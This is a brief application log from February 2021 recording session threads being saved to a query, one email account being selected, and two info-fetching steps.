INFO : 2021-02-13 20:06:56,932 - THREAD : saving session to query 
INFO : 2021-02-13 20:06:56,934 - session added to query ! 6
INFO : 2021-02-13 20:06:57,187 - THREAD : saving session to query 
INFO : 2021-02-13 20:06:57,189 - session added to query ! 7
INFO : 2021-02-13 20:06:57,308 - THREAD : saving session to query 
INFO : 2021-02-13 20:06:57,310 - session added to query ! 8
INFO : 2021-02-13 20:07:15,101 - email : skidrow.crack1@gmail.com selected 
INFO : 2021-02-13 20:07:26,123 - getting infos..
INFO : 2021-02-13 20:07:52,760 - getting infos..
